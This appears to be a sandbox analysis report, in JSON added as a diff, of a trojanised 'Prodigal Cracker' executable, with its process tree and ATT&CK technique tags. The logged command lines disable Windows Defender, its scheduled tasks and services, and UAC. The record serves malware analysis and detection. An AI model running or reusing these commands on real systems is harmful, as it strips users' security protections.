@@ -1,0 +1,646 @@
+{
+ "Name": "Prodigal Cracker.exe",
+ "Md5": "0a014ed09237a23ff272b04216d2f912",
+ "UUID": "1df99cf3-7560-49db-a4e4-874fea729aa6",
+ "Processes": [
+  {
+   "OID": "5f23664931cb7939b83759fd",
+   "ProcessID": 2824,
+   "ParentPID": 256,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\Prodigal Cracker.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\Prodigal Cracker.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1596155464520
+  },
+  {
+   "OID": "5f23665131cb7939b837629b",
+   "ProcessID": 2748,
+   "ParentPID": 2824,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\ProdigalCracker.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\ProdigalCracker.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155472958
+  },
+  {
+   "OID": "5f23665231cb7939b83767d0",
+   "ProcessID": 3836,
+   "ParentPID": 2824,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\ProdigalCracker.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\ProdigalCracker.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155473801
+  },
+  {
+   "OID": "5f23665231cb7939b83767d2",
+   "ProcessID": 988,
+   "ParentPID": 3836,
+   "CommandLine": "\"C:\\Windows\\system32\\cmd\" /c \"C:\\Users\\admin\\AppData\\Local\\Temp\\9098.tmp\\9099.tmp\\909A.bat C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\ProdigalCracker.exe\"",
+   "Image": "C:\\Windows\\system32\\cmd.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155473864
+  },
+  {
+   "OID": "5f23665231cb7939b83767d3",
+   "ProcessID": 2288,
+   "ParentPID": 988,
+   "CommandLine": "reg  delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155473922
+  },
+  {
+   "OID": "5f23665231cb7939b83767d4",
+   "ProcessID": 2344,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155473965
+  },
+  {
+   "OID": "5f23665231cb7939b83767d5",
+   "ProcessID": 1072,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474010
+  },
+  {
+   "OID": "5f23665231cb7939b83767d6",
+   "ProcessID": 844,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474051
+  },
+  {
+   "OID": "5f23665231cb7939b83767d7",
+   "ProcessID": 1908,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474088
+  },
+  {
+   "OID": "5f23665231cb7939b83767d8",
+   "ProcessID": 2720,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474127
+  },
+  {
+   "OID": "5f23665231cb7939b83767d9",
+   "ProcessID": 3300,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474166
+  },
+  {
+   "OID": "5f23665231cb7939b83767da",
+   "ProcessID": 3976,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474204
+  },
+  {
+   "OID": "5f23665231cb7939b83767db",
+   "ProcessID": 1128,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474244
+  },
+  {
+   "OID": "5f23665231cb7939b8377239",
+   "ProcessID": 2324,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474283
+  },
+  {
+   "OID": "5f23665231cb7939b837723a",
+   "ProcessID": 2668,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474356
+  },
+  {
+   "OID": "5f23665231cb7939b837723b",
+   "ProcessID": 1344,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474396
+  },
+  {
+   "OID": "5f23665231cb7939b837723c",
+   "ProcessID": 3808,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"2\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474446
+  },
+  {
+   "OID": "5f23665231cb7939b837723d",
+   "ProcessID": 1508,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474496
+  },
+  {
+   "OID": "5f23665231cb7939b837723e",
+   "ProcessID": 2260,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474533
+  },
+  {
+   "OID": "5f23665231cb7939b837723f",
+   "ProcessID": 2432,
+   "ParentPID": 988,
+   "CommandLine": "schtasks  /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable",
+   "Image": "C:\\Windows\\system32\\schtasks.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474578
+  },
+  {
+   "OID": "5f23665231cb7939b8377240",
+   "ProcessID": 3296,
+   "ParentPID": 988,
+   "CommandLine": "schtasks  /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable",
+   "Image": "C:\\Windows\\system32\\schtasks.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474642
+  },
+  {
+   "OID": "5f23665231cb7939b8377241",
+   "ProcessID": 4036,
+   "ParentPID": 988,
+   "CommandLine": "schtasks  /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable",
+   "Image": "C:\\Windows\\system32\\schtasks.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474701
+  },
+  {
+   "OID": "5f23665231cb7939b8377242",
+   "ProcessID": 2300,
+   "ParentPID": 988,
+   "CommandLine": "schtasks  /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable",
+   "Image": "C:\\Windows\\system32\\schtasks.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474763
+  },
+  {
+   "OID": "5f23665331cb7939b8377b99",
+   "ProcessID": 960,
+   "ParentPID": 988,
+   "CommandLine": "schtasks  /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable",
+   "Image": "C:\\Windows\\system32\\schtasks.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474859
+  },
+  {
+   "OID": "5f23665331cb7939b8377b9a",
+   "ProcessID": 3444,
+   "ParentPID": 988,
+   "CommandLine": "reg  delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v \"SecurityHealth\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474924
+  },
+  {
+   "OID": "5f23665331cb7939b8377b9b",
+   "ProcessID": 4092,
+   "ParentPID": 988,
+   "CommandLine": "reg  delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityHealth\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155474963
+  },
+  {
+   "OID": "5f23665331cb7939b8377b9c",
+   "ProcessID": 1928,
+   "ParentPID": 988,
+   "CommandLine": "reg  delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475006
+  },
+  {
+   "OID": "5f23665331cb7939b8377b9d",
+   "ProcessID": 688,
+   "ParentPID": 988,
+   "CommandLine": "reg  delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475046
+  },
+  {
+   "OID": "5f23665331cb7939b8377b9e",
+   "ProcessID": 2592,
+   "ParentPID": 988,
+   "CommandLine": "reg  delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475086
+  },
+  {
+   "OID": "5f23665331cb7939b8377b9f",
+   "ProcessID": 2964,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\System\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475133
+  },
+  {
+   "OID": "5f23665331cb7939b8377ba0",
+   "ProcessID": 3920,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\System\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475176
+  },
+  {
+   "OID": "5f23665331cb7939b8377ba1",
+   "ProcessID": 536,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475220
+  },
+  {
+   "OID": "5f23665331cb7939b8377ba2",
+   "ProcessID": 1800,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475259
+  },
+  {
+   "OID": "5f23665431cb7939b837843b",
+   "ProcessID": 2104,
+   "ParentPID": 988,
+   "CommandLine": "reg  add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475297
+  },
+  {
+   "OID": "5f23665431cb7939b837843c",
+   "ProcessID": 4008,
+   "ParentPID": 2824,
+   "CommandLine": "cmd /c \"\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\opener.bat\" \"",
+   "Image": "C:\\Windows\\system32\\cmd.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475402
+  },
+  {
+   "OID": "5f23665431cb7939b837843f",
+   "ProcessID": 2944,
+   "ParentPID": 4008,
+   "CommandLine": "ProdigalCracked.sfx.exe  -p12 -dC:\\Users\\admin\\AppData\\Local\\Temp",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\ProdigalCracked.sfx.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475543
+  },
+  {
+   "OID": "5f23665431cb7939b8378ebb",
+   "ProcessID": 3676,
+   "ParentPID": 2944,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX1\\ProdigalCracked.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX1\\ProdigalCracked.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155475980
+  },
+  {
+   "OID": "5f23665431cb7939b8378ebc",
+   "ProcessID": 1696,
+   "ParentPID": 3676,
+   "CommandLine": "\"C:\\Windows\\System32\\eventvwr.exe\" ",
+   "Image": "C:\\Windows\\System32\\eventvwr.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155476105
+  },
+  {
+   "OID": "5f23665431cb7939b8379639",
+   "ProcessID": 4044,
+   "ParentPID": 3676,
+   "CommandLine": "\"C:\\Windows\\System32\\eventvwr.exe\" ",
+   "Image": "C:\\Windows\\System32\\eventvwr.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155476355
+  },
+  {
+   "OID": "5f23665431cb7939b837963a",
+   "ProcessID": 2716,
+   "ParentPID": 2824,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\ProdigalCracked.sfx.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\ProdigalCracked.sfx.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155476558
+  },
+  {
+   "OID": "5f23666431cb7939b837a2cc",
+   "ProcessID": 2376,
+   "ParentPID": 2716,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX1\\ProdigalCracked.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX1\\ProdigalCracked.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155491277
+  },
+  {
+   "OID": "5f23666431cb7939b837a2cd",
+   "ProcessID": 3032,
+   "ParentPID": 2376,
+   "CommandLine": "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
+   "Image": "C:\\Windows\\System32\\cmd.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155491324
+  },
+  {
+   "OID": "5f23666431cb7939b837a2cf",
+   "ProcessID": 3124,
+   "ParentPID": 2376,
+   "CommandLine": "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\"",
+   "Image": "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155491339
+  },
+  {
+   "OID": "5f23666431cb7939b837a2d0",
+   "ProcessID": 1496,
+   "ParentPID": 3032,
+   "CommandLine": "C:\\Windows\\System32\\reg.exe  ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
+   "Image": "C:\\Windows\\System32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1596155491371
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5f23666431cb7939b837a2cc",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23666431cb7939b837a2cd",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1112",
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f23666431cb7939b837a2cc",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23666431cb7939b837a2cc",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23666431cb7939b837a2cc",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  },
+  {
+   "ProcessOID": "5f23666431cb7939b837a2cc",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23665431cb7939b837963a",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23664931cb7939b83759e9",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f23664931cb7939b83759fd",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1106"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665431cb7939b8378ebb",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23665431cb7939b8378ebb",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1042"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665431cb7939b8378ebb",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1088"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665431cb7939b8378ebb",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23665431cb7939b837843f",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23664931cb7939b83759fd",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665431cb7939b837843b",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1050",
+    "T1031",
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665331cb7939b8377ba2",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1050",
+    "T1031"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665331cb7939b8377ba1",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1050",
+    "T1031",
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665331cb7939b8377ba0",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1050",
+    "T1031",
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665331cb7939b8377b9f",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1050",
+    "T1031",
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665331cb7939b8377b99",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b8377242",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b8377241",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b8377240",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b837723f",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767d2",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767db",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767d9",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767d8",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767d7",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767d4",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767d2",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1112",
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767d0",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  },
+  {
+   "ProcessOID": "5f23665231cb7939b83767d0",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23665131cb7939b837629b",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f23664931cb7939b83759fd",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  }
+ ]
+}
